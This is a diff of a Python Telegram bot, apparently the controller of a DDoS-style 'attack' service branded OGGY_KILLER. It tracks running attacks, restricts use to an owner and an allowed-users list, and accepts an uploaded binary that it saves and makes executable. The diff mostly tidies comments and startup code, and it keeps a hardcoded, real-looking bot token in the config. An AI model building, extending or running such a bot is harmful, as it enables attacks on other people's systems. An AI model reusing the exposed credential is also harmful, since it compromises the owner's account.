@@ -7,7 +7,6 @@ import subprocess
 import threading
 import signal
 import time
-import shutil
 import json
 from datetime import datetime
 from pathlib import Path
@@ -20,10 +19,10 @@ except ImportError:
     sys.exit(1)
 
 # ==================== CONFIG ====================
-BOT_TOKEN = "8736196701:AAEMP3Hw8cNZ4lzHBT3NXXJEK12JoyrwplE"        # @BotFather se lo
-OWNER_ID = 8477195695                    # Owner ka ID (hardcoded)
-ALLOWED_USERS_FILE = "allowed_users.json" # File to store allowed users
-BINARY_NAME = "oggy"                     # Uploaded binary ka naam
+BOT_TOKEN = "8736196701:AAEMP3Hw8cNZ4lzHBT3NXXJEK12JoyrwplE"   # Your token
+OWNER_ID = 8477195695                                         # Owner ID
+ALLOWED_USERS_FILE = "allowed_users.json"
+BINARY_NAME = "oggy"
 BINARY_PATH = f"./{BINARY_NAME}"
 # =================================================
 
@@ -31,7 +30,7 @@ BINARY_PATH = f"./{BINARY_NAME}"
 attack_thread = None
 attack_running = False
 current_attack_info = {}
-allowed_users = set()   # Will load from file
+allowed_users = set()
 
 # ---------- Allowed Users Management ----------
 def load_allowed_users():
@@ -45,7 +44,6 @@ def load_allowed_users():
             allowed_users = set()
     else:
         allowed_users = set()
-    # Always ensure owner is allowed
     allowed_users.add(str(OWNER_ID))
     save_allowed_users()
 
@@ -139,7 +137,6 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     document = update.message.document
-    file_name = document.file_name
     file_size = document.file_size
     
     if file_size > 10 * 1024 * 1024:
@@ -148,9 +145,8 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         file = await document.get_file()
-        file_path = BINARY_PATH
-        await file.download_to_drive(file_path)
-        os.chmod(file_path, 0o755)
+        await file.download_to_drive(BINARY_PATH)
+        os.chmod(BINARY_PATH, 0o755)
         
         exists, msg = check_binary_exists()
         if not exists:
@@ -382,14 +378,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ---------- Main ----------
 def main():
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("[!] Bot token set karo! @BotFather se lo.")
-        sys.exit(1)
-    
-    load_allowed_users()
-    print(f"🔥 OGGY_KILLER ULTIMATE BOT STARTING...")
+    print("🔥 OGGY_KILLER ULTIMATE BOT STARTING...")
     print(f"🤖 Owner ID: {OWNER_ID}")
     print(f"📁 Binary path: {BINARY_PATH}")
+    load_allowed_users()
     print(f"👥 Allowed users loaded: {len(allowed_users)}")
     print("💀 CHUMT KA DARINDA ready!\n")
     
